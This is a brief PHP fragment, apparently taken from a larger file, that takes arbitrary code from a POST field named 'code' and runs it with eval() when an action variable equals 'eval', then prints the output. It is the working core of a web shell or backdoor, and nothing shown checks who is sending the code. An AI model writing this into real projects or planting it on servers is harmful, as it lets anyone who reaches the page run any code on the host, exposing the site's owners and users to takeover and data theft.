<?php
if(($action === "eval")&&(isset($_POST["code"])))
{
    $code = $_POST["code"];
    ob_start();
    eval($code);
    $result = ob_get_clean();
    echo $result;
}

?>